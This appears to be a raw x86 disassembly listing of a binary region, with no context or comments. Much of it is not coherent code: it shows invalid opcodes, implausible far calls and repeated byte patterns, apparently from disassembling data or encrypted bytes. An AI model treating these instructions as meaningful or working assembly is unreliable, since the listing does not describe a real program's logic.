  43577b:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  435781:	call   0xdb33b92e
  435786:	push   0xe20d6161
  43578b:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  43578f:	test   DWORD PTR [ebx],ecx
  435791:	call   0xa8e8:0x5e343ac9
  435798:	popa   
  435799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43579a:	jne    0x435722
  43579c:	mov    dl,0x6b
  43579e:	or     eax,0x625c28e2
  4357a3:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4357a9:	xor    al,0x5e
  4357ab:	call   0x7d33b958
  4357b0:	push   0x75136161
  4357b5:	push   ebp
  4357b6:	pop    ss
  4357b7:	loop   0x4357d1
  4357b9:	pop    esp
  4357ba:	bound  esp,QWORD PTR [edx+0xd]
  4357bd:	loop   0x4357d7
  4357bf:	pop    esp
  4357c0:	bound  esp,QWORD PTR [edx+0x13]
  4357c3:	adc    esi,DWORD PTR [ecx]
  4357c5:	pop    esp
  4357c6:	bound  esp,QWORD PTR [edx+0x17]
  4357c9:	call   0x6262:0x5c58e213
  4357d0:	pop    ss
  4357d1:	jne    0x43583c
  4357d3:	or     eax,0xcd0d6975
  4357d8:	xchg   BYTE PTR [edi],dl
  4357da:	call   0x6262:0x5c28e20d
  4357e1:	test   DWORD PTR [ebx],ecx
  4357e3:	call   0xa8e8:0x5e343ac9
  4357ea:	popa   
  4357eb:	pop    ss
  4357ec:	loop   0x43583e
  4357ee:	pop    esp
  4357ef:	bound  esp,QWORD PTR [edx+0x62]
  4357f2:	mov    dl,0x86
  4357f4:	repz loopne 0x43584c
  4357f7:	bound  esp,QWORD PTR [edx+0x17]
  4357fa:	loop   0x435844
  4357fc:	pop    esp
  4357fd:	bound  esp,QWORD PTR [edx+0xd]
  435800:	jne    0x43579c
  435802:	or     eax,0xe2177ea2
  435807:	repz pop esp
  435809:	bound  esp,QWORD PTR [edx+0xd]
  43580c:	jne    0x4357a8
  43580e:	fcomp  DWORD PTR [esi+edi*2]
  435811:	mov    eax,ds:0x625cf3e2
  435816:	bound  edx,QWORD PTR [ebx+0x6161546e]
  43581c:	popa   
  43581d:	or     eax,0x625cf3e2
  435822:	(bad)  
  435823:	fdiv   st,st(3)
  435825:	call   0x6262:0x5c64e217
  43582c:	or     eax,0x625c64e2
  435831:	bound  esp,QWORD PTR [edx-0x15]
  435834:	cmp    bl,dh
  435836:	push   es
  435837:	bound  esp,QWORD PTR [bp+si+0x17]
  43583b:	loop   0x43588d
  43583d:	pop    esp
  43583e:	bound  esp,QWORD PTR [edx+0x62]
  435841:	or     edx,DWORD PTR [eax+0x5c]
  435844:	bound  esp,QWORD PTR [edx+0x62]
  435847:	mov    dl,0x55
  435849:	repz hlt 
  43584b:	push   ebp
  43584c:	bound  esp,QWORD PTR [edx+0xd]
  43584f:	loop   0x435879
  435851:	pop    esp
  435852:	bound  esp,QWORD PTR [edx-0x7b]
  435855:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43585b:	call   0xe2eaba08
  435860:	dec    eax
  435861:	pop    esp
  435862:	bound  esp,QWORD PTR [edx-0x4e]
  435865:	call   0x5ed4:0xf355b262
  43586c:	bound  esp,QWORD PTR [edx+0xd]
  43586f:	loop   0x4358bd
  435871:	pop    esp
  435872:	bound  esp,QWORD PTR [edx-0x7b]
  435875:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43587b:	call   0x6315ba28
  435880:	or     ebx,DWORD PTR [eax+0x5c]
  435883:	bound  esp,QWORD PTR [edx+0x62]
  435886:	mov    dl,0x55
  435888:	repz cmp cl,BYTE PTR [edx+0x62]
  43588c:	bound  ecx,QWORD PTR ds:0x625c2813
  435892:	(bad)  
  435893:	(bad)  
  435894:	outs   dx,DWORD PTR ds:[esi]
  435895:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43589b:	pop    esi
  43589c:	call   0x1feaba49
  4358a1:	mov    dl,0x97
  4358a3:	or     eax,0x625c64e2
  4358a8:	bound  ecx,QWORD PTR ds:0x7fee8aa2
  4358ae:	or     eax,0x625cf3e2
  4358b3:	bound  ecx,QWORD PTR ds:0xf3e21761
  4358b9:	pop    esp
  4358ba:	bound  esp,QWORD PTR [edx-0x10]
  4358bd:	shl    BYTE PTR [edx+0x62],1
  4358c0:	bound  ecx,QWORD PTR ds:0x625c28e2
  4358c6:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4358cc:	xor    al,0x5e
  4358ce:	call   0x229aba7b
  4358d3:	xchg   BYTE PTR [ecx-0x5b],ah
  4358d6:	or     eax,0x7e64d864
  4358db:	or     eax,0x75179275
  4358e0:	imul   ebx,eax,0xe7619aea
  4358e6:	cmp    ebx,eax
  4358e8:	jmp    0x1caf:0x3ab26186
  4358ef:	lock mov eax,ds:0xaf616168
  4358f5:	sbb    al,0x94
  4358f7:	pop    ss
  4358f8:	jne    0x43592b
  4358fa:	fcom   DWORD PTR [ebp+0x1caf615d]
  435900:	mov    ds:0x68616e93,al
  435905:	popa   
  435906:	popa   
  435907:	and    DWORD PTR [ebp+0x55],esi
  43590a:	fisub  WORD PTR [ecx+0x61]
  43590d:	popa   
  43590e:	scas   eax,DWORD PTR es:[edi]
  43590f:	sbb    al,0x94
  435911:	pop    ss
  435912:	jne    0x435978
  435914:	out    dx,al
  435915:	xchg   BYTE PTR [ebp+ecx*1-0x276b9b8b],dl
  43591c:	sbb    al,0x68
  43591e:	xchg   esp,eax
  43591f:	pop    ss
  435920:	jne    0x435986
  435922:	xchg   ebx,eax
  435923:	bnd jne 0x43598a
  435926:	or     eax,0xf29386cd
  43592b:	sar    ebx,1
  43592d:	(bad)  
  43592e:	outs   dx,DWORD PTR ds:[esi]
  43592f:	or     bl,BYTE PTR [edx]
  435931:	popa   
  435932:	popa   
  435933:	(bad)  
  435934:	pop    ds
  435935:	mov    ecx,0x936161a7
  43593a:	repnz push edi
  43593c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43593d:	pop    ds
  43593e:	xchg   ebx,eax
  43593f:	adc    edx,DWORD PTR [ecx]
  435941:	popa   
  435942:	popa   
  435943:	popa   
  435944:	xchg   ebx,eax
  435945:	bnd jne 0x4359ac
  435948:	or     eax,0xf29386cd
  43594d:	sub    al,0xd6
  43594f:	pop    edi
  435950:	xchg   ebx,eax
  435951:	repnz int 0x31
  435954:	(bad)  
  435955:	lock mov ecx,0x936161a7
  43595b:	repnz push edi
  43595d:	(bad)  
  43595e:	outs   dx,DWORD PTR ds:[esi]
  43595f:	or     bl,BYTE PTR [edx]
  435961:	popa   
  435962:	popa   
  435963:	xchg   ebx,eax
  435964:	repnz push edi
  435966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435967:	pop    ds
  435968:	out    0x5f,eax
  43596a:	out    dx,al
  43596b:	mov    ebx,0x6475f293
  435970:	or     eax,0xf29386cd
  435975:	not    esi
  435977:	popf   
  435978:	xor    al,0xcc
  43597a:	popa   
  43597b:	popa   
  43597c:	mov    dl,0x93
  43597e:	xchg   ebx,eax
  43597f:	bnd jne 0x4359b3
  435982:	or     eax,0x1e939acd
  435987:	imul   DWORD PTR [eax-0x1e]
  43598a:	sbb    al,0xe7
  43598c:	jb     0x435921
  43598e:	bnd jne 0x4359f5
  435991:	or     eax,0xf29386cd
  435996:	not    esi
  435998:	xchg   ebx,eax
  435999:	repnz int 0x31
  43599c:	or     eax,0x93949aa5
  4359a1:	push   ds
  4359a2:	xchg   BYTE PTR [eax-0x29a80d6d],dl
  4359a8:	lock mov ecx,0x936161a7
  4359ae:	repnz push edi
  4359b0:	(bad)  
  4359b1:	outs   dx,DWORD PTR ds:[esi]
  4359b2:	or     bl,BYTE PTR [edx]
  4359b4:	popa   
  4359b5:	popa   
  4359b6:	xchg   ebx,eax
  4359b7:	repnz push edi
  4359b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4359ba:	pop    ds
  4359bb:	mov    dl,0x88
  4359bd:	and    DWORD PTR [ebp+0x55],esi
  4359c0:	loope  0x435a23
  4359c2:	popa   
  4359c3:	popa   
  4359c4:	or     eax,0x17a25d75
  4359c9:	jne    0x435a28
  4359cb:	out    dx,al
  4359cc:	mov    esi,gs
  4359ce:	cmp    ah,BYTE PTR [ecx]
  4359d0:	jne    0x435a27
  4359d2:	loopne 0x435a35
  4359d4:	popa   
  4359d5:	popa   
  4359d6:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4359d8:	bound  esp,QWORD PTR [edx+0x62]
  4359db:	xchg   ebx,eax
  4359dc:	bnd jne 0x435a10
  4359df:	or     eax,0x1e939acd
  4359e4:	imul   DWORD PTR [eax-0x1e]
  4359e7:	sbb    al,0xb2
  4359e9:	pop    edi
  4359ea:	out    dx,al
  4359eb:	xchg   DWORD PTR [ebp+ecx*1-0x276bce8b],edx
  4359f2:	sbb    al,0x68
  4359f4:	xchg   esp,eax
  4359f5:	pop    ss
  4359f6:	jne    0x435a29
  4359f8:	fsubr  st,st(2)
  4359fa:	push   ebp
  4359fb:	loopne 0x4359af
  4359fd:	imul   DWORD PTR [edi-0xfd211e4]
  435a03:	dec    edx
  435a04:	arpl   WORD PTR [edx+0x62],sp
  435a07:	xchg   ebx,eax
  435a08:	bnd jne 0x435a68
  435a0b:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  435a11:	repnz sbb al,0x85
  435a14:	or     bl,BYTE PTR [edx]
  435a16:	popa   
  435a17:	popa   
  435a18:	xchg   ebx,eax
  435a19:	repnz sbb al,0xd
  435a1c:	int    0x86
  435a1e:	xchg   ebx,eax
  435a1f:	repnz sar ebx,1
  435a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435a23:	pop    ds
  435a24:	out    0xf7,eax
  435a26:	scas   eax,DWORD PTR es:[edi]
  435a27:	sbb    al,0xee
  435a29:	push   esi
  435a2a:	scas   eax,DWORD PTR es:[edi]
  435a2b:	sbb    al,0xa2
  435a2d:	push   edi
  435a2e:	and    al,BYTE PTR [esi+0x640da561]
  435a34:	fsub   DWORD PTR [esi+eiz*8+0xd]
  435a38:	jne    0x435ab8
  435a3a:	pop    ss
  435a3b:	jne    0x435aa6
  435a3d:	or     eax,0xdb0d6975
  435a42:	and    al,0x68
  435a44:	popa   
  435a45:	popa   
  435a46:	fsubr  DWORD PTR [edx+0xd88b261]
  435a4c:	jne    0x4359e8
  435a4e:	test   DWORD PTR [ebx],ecx
  435a50:	call   0xa8e8:0x5e343ac9
  435a57:	popa   
  435a58:	lock int 0x5f
  435a5b:	popa   
  435a5c:	popa   
  435a5d:	jo     0x435a05
  435a5f:	bound  esi,QWORD PTR [edx+0x55c1f392]
  435a65:	bound  esp,QWORD PTR [edx+0xd]
  435a68:	jne    0x435ad3
  435a6a:	pop    ss
  435a6b:	jne    0x435ab9
  435a6d:	or     eax,0x1cd86975
  435a72:	js     0x435a8b
  435a74:	jne    0x435ace
  435a76:	or     eax,0x1cd86975
  435a7b:	sub    al,0x17
  435a7d:	jne    0x435aa7
  435a7f:	or     eax,0x1cd86975
  435a84:	xchg   esp,eax
  435a85:	pop    ss
  435a86:	jne    0x435ad8
  435a88:	or     eax,0x4346975
  435a8d:	popa   
  435a8e:	popa   
  435a8f:	popa   
  435a90:	pop    ss
  435a91:	jne    0x435acf
  435a93:	or     eax,0xbb346975
  435a98:	popa   
  435a99:	popa   
  435a9a:	popa   
  435a9b:	pop    ss
  435a9c:	jne    0x435ae6
  435a9e:	or     eax,0x4c346975
  435aa3:	popa   
  435aa4:	popa   
  435aa5:	popa   
  435aa6:	pop    ss
  435aa7:	jne    0x435ac1
  435aa9:	or     eax,0xed346975
  435aae:	popa   
  435aaf:	popa   
  435ab0:	popa   
  435ab1:	pop    ss
  435ab2:	jne    0x435aa7
  435ab4:	or     eax,0x92346975
  435ab9:	push   0x75176161
  435abe:	fs or  eax,0xa8346975
  435ac4:	push   0x75176161
  435ac9:	xor    DWORD PTR ds:0xbe346975,ecx
  435acf:	push   0x75176161
  435ad4:	pop    ebp
  435ad5:	or     eax,0xb859a75
  435ada:	call   0xa8e8:0x5e343ac9
  435ae1:	popa   
  435ae2:	pop    ss
  435ae3:	jne    0x435b3a
  435ae5:	bound  esi,QWORD PTR [edx+0x6261707e]
  435aeb:	mov    dl,0x69
  435aed:	or     eax,0xad626975
  435af2:	mov    cl,0x68
  435af4:	popa   
  435af5:	popa   
  435af6:	repz push ebp
  435af8:	push   0xdd26161
  435afd:	jne    0x435b68
  435aff:	or     eax,0x616824db
  435b04:	popa   
  435b05:	bound  esi,QWORD PTR [edx-0xd]
  435b08:	xor    edx,DWORD PTR [ebp+0x62]
  435b0b:	bound  edx,QWORD PTR [edi]
  435b0d:	jne    0x435b64
  435b0f:	or     eax,0xb859a75
  435b14:	call   0xa8e8:0x5e343ac9
  435b1b:	popa   
  435b1c:	mov    eax,ds:0x6e935575
  435b21:	fldcw  WORD PTR [eax+0x61]
  435b24:	popa   
  435b25:	or     eax,0xcd0d5575
  435b2a:	push   ebp
  435b2b:	push   esi
  435b2c:	ficom  DWORD PTR [esi+0xd1ccd17]
  435b32:	jne    0x435b50
  435b34:	or     eax,0xda5655cd
  435b39:	jecxz  0x435b52
  435b3b:	int    0xfd
  435b3d:	or     eax,0xcd0dfd75
  435b42:	push   ebp
  435b43:	push   esi
  435b44:	fidiv  DWORD PTR [esi+0x17]
  435b47:	int    0xf9
  435b49:	or     eax,0xcd0dfd75
  435b4e:	push   ebp
  435b4f:	push   esi
  435b50:	(bad)  
  435b52:	pop    ss
  435b53:	int    0x54
  435b55:	or     eax,0xa20dfd75
  435b5a:	mov    ss,WORD PTR [esi+0x75]
  435b5d:	push   ebp
  435b5e:	pop    ss
  435b5f:	jne    0x435b75
  435b61:	or     eax,0xcd0dfd75
  435b66:	std    
  435b67:	or     eax,0x99a77ea2
  435b6c:	mov    al,ch
  435b6e:	xchg   edi,eax
  435b6f:	or     eax,0xa20dfd75
  435b74:	jle    0x435b8d
  435b76:	jne    0x435b61
  435b78:	out    dx,al
  435b79:	xchg   ecx,eax
  435b7a:	or     eax,0xa20dfd75
  435b7f:	mov    dl,BYTE PTR [edi]
  435b81:	jne    0x435b6c
  435b83:	or     eax,0x7517e975
  435b88:	and    al,0xd
  435b8a:	jne    0x435b26
  435b8c:	test   DWORD PTR [ebx],ecx
  435b8e:	call   0xa8e8:0x5e343ac9
  435b95:	popa   
  435b96:	pop    ss
  435b97:	jne    0x435b4a
  435b99:	and    DWORD PTR [ebp+0x20],esi
  435b9c:	xchg   edi,eax
  435b9d:	popa   
  435b9e:	popa   
  435b9f:	popa   
  435ba0:	or     eax,0xb859a75
  435ba5:	call   0xa8e8:0x5e343ac9
  435bac:	popa   
  435bad:	pop    ss
  435bae:	jne    0x435bb1
  435bb0:	out    dx,al
  435bb1:	imul   ecx,DWORD PTR ds:0xb858675,0xffffff9a
  435bb8:	leave  
  435bb9:	cmp    cl,BYTE PTR ds:0x6e1301cd
  435bbf:	push   0x61a8e85e
  435bc4:	pop    ss
  435bc5:	jne    0x435bc8
  435bc7:	or     eax,0x75a70175
  435bcc:	and    al,0x93
  435bce:	fsubr  DWORD PTR [eax]
  435bd0:	popa   
  435bd1:	popa   
  435bd2:	popa   
  435bd3:	or     eax,0x75a7b175
  435bd8:	and    al,ch
  435bda:	xor    al,0xf0
  435bdc:	and    DWORD PTR [ecx+0x61],esp
  435bdf:	popa   
  435be0:	or     eax,0xcd0d0175
  435be5:	adc    al,0x93
  435be7:	repnz neg DWORD PTR [ecx+0xd607517]
  435bee:	jne    0x435bed
  435bf0:	or     eax,0xdaa701cd
  435bf5:	mov    dh,BYTE PTR [ebx-0x69]
  435bf8:	or     eax,0xcd0dfd75
  435bfd:	pusha  
  435bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435bff:	fidivr DWORD PTR [esi-0x18]
  435c02:	xor    al,0xf0
  435c04:	or     DWORD PTR [ecx+0x61],esp
  435c07:	popa   
  435c08:	or     eax,0xcd0d0175
  435c0d:	push   esp
  435c0e:	or     eax,0x7e5655a5
  435c13:	(bad)  
  435c14:	pop    ss
  435c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435c16:	or     BYTE PTR ds:0xcd0d6075,cl
  435c1c:	stc    
  435c1d:	or     eax,0x7e5655a5
  435c22:	(bad)  
  435c23:	pop    ss
  435c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435c25:	lods   eax,DWORD PTR ds:[esi]
  435c26:	or     eax,0xb859a75
  435c2b:	call   0xa8e8:0x5e343ac9
  435c32:	popa   
  435c33:	pop    ss
  435c34:	jne    0x435c2b
  435c36:	out    dx,al
  435c37:	imul   ecx,DWORD PTR ds:0xb858675,0xffffff9a
  435c3e:	leave  
  435c3f:	cmp    cl,BYTE PTR ds:0x6e13f5cd
  435c45:	push   0x61a8e85e
  435c4a:	pop    ss
  435c4b:	jne    0x435c42
  435c4d:	or     eax,0x75a7f575
  435c52:	and    BYTE PTR [ebx-0x33],dh
  435c55:	or     eax,0xb859a75
  435c5a:	call   0xa8e8:0x5e343ac9
  435c61:	popa   
  435c62:	or     eax,0xa50df5cd
  435c67:	xchg   edx,eax
  435c68:	mov    eax,ds:0x5fe71af7
  435c6d:	out    dx,al
  435c6e:	push   edi
  435c6f:	bound  esi,QWORD PTR [edx-0xa8af297]
  435c75:	(bad)  
  435c76:	out    0xe2,eax
  435c78:	dec    esp
  435c79:	bound  esi,QWORD PTR [edx+0x55bef308]
  435c7f:	bound  esp,QWORD PTR [edx+0xd]
  435c82:	int    0x9a
  435c84:	(bad)  
  435c85:	outs   dx,DWORD PTR ds:[esi]
  435c86:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435c8c:	pop    esi
  435c8d:	call   0x1feabe3a
  435c92:	out    0x86,eax
  435c94:	or     eax,0xcd0df575
  435c99:	xchg   edx,eax
  435c9a:	or     eax,0x7e17ada5
  435c9f:	(bad)  
  435ca0:	out    dx,al
  435ca1:	out    dx,eax
  435ca2:	lock xchg edi,eax
  435ca4:	bound  esp,QWORD PTR [edx+0x62]
  435ca7:	or     eax,0x22575575
  435cac:	xchg   edx,eax
  435cad:	popa   
  435cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435caf:	or     eax,0x750dc964
  435cb4:	call   0x9ab2:0x62557517
  435cbb:	or     eax,0xad625575
  435cc0:	dec    eax
  435cc1:	push   0x257a6161
  435cc6:	loop   0x435cc9
  435cc8:	imul   edi,DWORD PTR [edx-0x53],0xf36901e2
  435ccf:	mov    esp,0xd62625c
  435cd4:	int    0x55
  435cd6:	or     eax,0x6168f517
  435cdb:	popa   
  435cdc:	pop    ss
  435cdd:	push   0xd55750d
  435ce2:	fcomi  st,st(5)
  435ce4:	push   0xaad86161
  435ce9:	popa   
  435cea:	out    0x34,eax
  435cec:	scas   eax,DWORD PTR es:[edi]
  435ced:	sbb    al,0xa2
  435cef:	out    dx,al
  435cf0:	pop    edi
  435cf1:	scas   eax,DWORD PTR es:[edi]
  435cf2:	sbb    al,0x57
  435cf4:	and    dh,bh
  435cf6:	popa   
  435cf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435cf8:	or     eax,0xdc9c964
  435cfd:	jne    0x435c85
  435cff:	pop    ss
  435d00:	jne    0x435d57
  435d02:	or     eax,0x481f9275
  435d07:	xor    al,0xd
  435d09:	int    0x55
  435d0b:	or     eax,0x61680417
  435d10:	popa   
  435d11:	adc    esi,edi
  435d13:	cdq    
  435d14:	pop    ss
  435d15:	jne    0x435d80
  435d17:	or     eax,0xf2939a75
  435d1c:	popa   
  435d1d:	popf   
  435d1e:	xor    al,0xcc
  435d20:	popa   
  435d21:	popa   
  435d22:	out    0x38,eax
  435d24:	or     eax,0xf2939a75
  435d29:	popa   
  435d2a:	test   DWORD PTR [edx],ecx
  435d2c:	sbb    ah,BYTE PTR [ecx+0x61]
  435d2f:	xor    al,0xb9
  435d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435d32:	popa   
  435d33:	popa   
  435d34:	or     eax,0x179469cd
  435d39:	push   0xa269750d
  435d3e:	mov    ds:0xd697517,al
  435d43:	jne    0x435cdf
  435d45:	mov    ds:0x9a7517a2,al
  435d4a:	out    dx,al
  435d4b:	dec    ebp
  435d4c:	scas   eax,DWORD PTR es:[edi]
  435d4d:	sbb    al,0xd
  435d4f:	int    0x69
  435d51:	xchg   esp,eax
  435d52:	pop    ss
  435d53:	push   0x1f92750d
  435d58:	dec    eax
  435d59:	xor    al,0xd
  435d5b:	int    0x55
  435d5d:	or     eax,0x61680417
  435d62:	popa   
  435d63:	adc    esi,edi
  435d65:	cdq    
  435d66:	push   edi
  435d67:	and    al,BYTE PTR [esi+0x640da561]
  435d6d:	leave  
  435d6e:	leave  
  435d6f:	or     eax,0x75178675
  435d74:	push   ebp
  435d75:	or     eax,0x481f9275
  435d7a:	xor    al,0xd
  435d7c:	int    0x55
  435d7e:	or     eax,0x61680417
  435d83:	popa   
  435d84:	adc    esi,edi
  435d86:	cdq    
  435d87:	pop    ss
  435d88:	jne    0x435df3
  435d8a:	or     eax,0x1e939a75
  435d8f:	popa   
  435d90:	fsubr  DWORD PTR [ecx-0x20]
  435d93:	out    0x7f,eax
  435d95:	or     eax,0x6939a75
  435d9a:	popa   
  435d9b:	test   eax,ebx
  435d9d:	popa   
  435d9e:	popa   
  435d9f:	popa   
  435da0:	fcomp  DWORD PTR [edx+ebx*4]
  435da3:	or     eax,0x680469cd
  435da8:	or     eax,0x17a26975
  435dad:	jne    0x435e18
  435daf:	or     eax,0x17a29a75
  435db4:	jne    0x435d50
  435db6:	out    dx,al
  435db7:	inc    esi
  435db8:	or     eax,0x61ff6975
  435dbd:	popa   
  435dbe:	or     eax,0x481f9275
  435dc3:	xor    al,0xd
  435dc5:	int    0x55
  435dc7:	or     eax,0x61680417
  435dcc:	popa   
  435dcd:	adc    esi,edi
  435dcf:	cdq    
  435dd0:	push   edi
  435dd1:	and    al,BYTE PTR [esi+0x640da561]
  435dd7:	fsub   DWORD PTR [esi+esi*2+0x21]
  435ddb:	jne    0x435e0e
  435ddd:	lods   eax,DWORD PTR ds:[esi]
  435dde:	loop   0x435de1
  435de0:	imul   esp,DWORD PTR [ecx],0xe2256475
  435de6:	add    DWORD PTR [ecx+0xd],ebp
  435de9:	jne    0x435d85
  435deb:	or     eax,0x69751761
  435df0:	and    DWORD PTR [ebp+0x55],esi
  435df3:	adc    al,0xe2
  435df5:	add    DWORD PTR [ecx+0x21],ebp
  435df8:	jne    0x435e57
  435dfa:	or     al,0x8a
  435dfc:	push   ecx
  435dfd:	icebp  
  435dfe:	or     eax,0xb856475
  435e03:	call   0xa8e8:0x5e343ac9
  435e0a:	popa   
  435e0b:	or     eax,0x6fd631cd
  435e10:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e16:	pop    esi
  435e17:	call   0xbad6bfc4
  435e1c:	pop    ds
  435e1d:	pop    ss
  435e1e:	jne    0x435e13
  435e20:	out    dx,al
  435e21:	imul   ecx,DWORD PTR ds:0xb856475,0xffffff9a
  435e28:	leave  
  435e29:	cmp    cl,BYTE PTR ds:0x6e13f3cd
  435e2f:	push   0x61a8e85e
  435e34:	pop    ss
  435e35:	jne    0x435e2a
  435e37:	or     eax,0xb855575
  435e3c:	call   0xa8e8:0x5e343ac9
  435e43:	popa   
  435e44:	or     eax,0x6fd664cd
  435e49:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e4f:	pop    esi
  435e50:	call   0x1f70bffd
  435e55:	mov    eax,ds:0xb493f375
  435e5a:	(bad)  [ecx+0x61]
  435e5d:	popa   
  435e5e:	or     eax,0xb856975
  435e63:	call   0xa8e8:0x5e343ac9
  435e6a:	popa   
  435e6b:	or     eax,0x6fd664cd
  435e70:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e76:	pop    esi
  435e77:	call   0x1fc2c024
  435e7c:	out    0x9e,eax
  435e7e:	or     eax,0xb856975
  435e83:	call   0xa8e8:0x5e343ac9
  435e8a:	popa   
  435e8b:	or     eax,0x6fd664cd
  435e90:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e96:	pop    esi
  435e97:	call   0xf388c044
  435e9c:	or     eax,0x6fd65dcd
  435ea1:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435ea7:	pop    esi
  435ea8:	call   0x1ff2c055
  435ead:	pop    ss
  435eae:	jne    0x435ec8
  435eb0:	out    dx,al
  435eb1:	jns    0x435ec0
  435eb3:	jne    0x435f1e
  435eb5:	test   DWORD PTR [ebx],ecx
  435eb7:	call   0xa8e8:0x5e343ac9
  435ebe:	popa   
  435ebf:	or     eax,0x6fd664cd
  435ec4:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435eca:	pop    esi
  435ecb:	call   0xf388c078
  435ed0:	pop    ss
  435ed1:	jne    0x435eeb
  435ed3:	or     eax,0x75171875
  435ed8:	imul   esi,eax,0x6262622c
  435ede:	or     eax,0xcd0d9a75
  435ee3:	imul   edx,DWORD PTR [edi],0x69750d9a
  435ee9:	push   edi
  435eea:	and    dh,bh
  435eec:	popa   
  435eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435eee:	or     eax,0x7264d664
  435ef3:	mul    DWORD PTR [ecx+0x61]
  435ef6:	iret   
  435ef7:	and    edx,esp
  435ef9:	repz pop esi
  435efb:	bound  esp,QWORD PTR [edx-0x53]
  435efe:	loop   0x435f01
  435f00:	imul   esp,DWORD PTR [ecx],0x625e3ce2
  435f06:	bound  esp,QWORD PTR ds:0x216901e2
  435f0c:	jne    0x435f6b
  435f0e:	lods   eax,DWORD PTR ds:[esi]
  435f0f:	mov    ch,0x1
  435f11:	imul   esp,DWORD PTR [ecx],0x625e48e2
  435f17:	bound  ebp,QWORD PTR [edi]
  435f19:	loop   0x435f1c
  435f1b:	imul   ecx,DWORD PTR ds:0x625ef3e2,0x9a0b8562
  435f25:	leave  
  435f26:	cmp    dh,BYTE PTR [esi+ebx*2]
  435f29:	call   0x755ac0d6
  435f2e:	imul   esp,DWORD PTR [ecx],0xe2145575
  435f34:	add    DWORD PTR [ecx+0x21],ebp
  435f37:	loop   0x435f9d
  435f39:	pop    esi
  435f3a:	bound  esp,QWORD PTR [edx+0xc]
  435f3d:	mov    dl,BYTE PTR [ecx-0xf]
  435f40:	or     eax,0x3ce20d57
  435f45:	pop    esi
  435f46:	bound  esp,QWORD PTR [edx-0x7b]
  435f49:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  435f4f:	call   0x1350c0fc
  435f54:	repz pop esi
  435f56:	bound  esp,QWORD PTR [edx-0x2a]
  435f59:	outs   dx,DWORD PTR ds:[esi]
  435f5a:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435f60:	pop    esi
  435f61:	call   0xbad6c10e
  435f66:	pop    ds
  435f67:	pop    ss
  435f68:	jne    0x435f9b
  435f6a:	out    dx,al
  435f6b:	mov    cl,BYTE PTR ds:0x625e3ce2
  435f71:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  435f77:	or     eax,0x6e1331cd
  435f7c:	push   0x61a8e85e
  435f81:	pop    ss
  435f82:	jne    0x435fb5
  435f84:	or     eax,0xcd0d3175
  435f89:	pop    ebp
  435f8a:	(bad)  
  435f8b:	outs   dx,DWORD PTR ds:[esi]
  435f8c:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435f92:	pop    esi
  435f93:	call   0xe450c140
  435f98:	cmp    al,0x5e
  435f9a:	bound  esp,QWORD PTR [edx-0x2a]
  435f9d:	or     bx,WORD PTR [edx+0x22d63ac9]
  435fa4:	pop    esi
  435fa5:	call   0x4e70c152
  435faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435fab:	pop    ds
  435fac:	les    ebp,FWORD PTR ds:0x3331750d
  435fb2:	pop    esi
  435fb3:	call   0xbc8c160
  435fb8:	call   0x1369:0x75173ac9
  435fbf:	jne    0x43602a
  435fc1:	shl    bl,cl
  435fc3:	lea    esp,[ebx+0x62]
  435fc6:	bound  edx,QWORD PTR [edi]
  435fc8:	jne    0x436033
  435fca:	or     eax,0xcd0d3175
  435fcf:	imul   edx,DWORD PTR [edi],0x5e31e210
  435fd5:	bound  esp,QWORD PTR [edx-0x12]
  435fd8:	add    eax,0x5e48e20d
  435fdd:	bound  esp,QWORD PTR [edx-0x7b]
  435fe0:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  435fe6:	call   0x755ac193
  435feb:	imul   esp,DWORD PTR [ecx],0x625e18e2
  435ff1:	bound  ebp,QWORD PTR [edi]
  435ff3:	mov    ch,0x1
  435ff5:	imul   ecx,DWORD PTR ds:0x86750d3d,0x5ef3130d
  435fff:	bound  esp,QWORD PTR [edx-0x2a]
  436002:	outs   dx,DWORD PTR ds:[esi]
  436003:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  436009:	pop    esi
  43600a:	call   0x1feac1b7
  43600f:	xchg   ebx,eax
  436010:	outs   dx,BYTE PTR ds:[esi]
  436011:	out    dx,eax
  436012:	popa   
  436013:	popa   
  436014:	popa   
  436015:	or     eax,0x6fd655cd
  43601a:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  436020:	pop    esi
  436021:	call   0x7550c1ce
  436026:	imul   eax,DWORD PTR [ebp-0xd],0x5e50e217
  43602d:	bound  esp,QWORD PTR [edx+0xd]
  436030:	jne    0x435fcc
  436032:	sbb    ah,BYTE PTR [ecx+0x4]
  436035:	loop   0x436088
  436037:	pop    esi
  436038:	bound  esp,QWORD PTR [edx-0x6d]
  43603b:	push   es
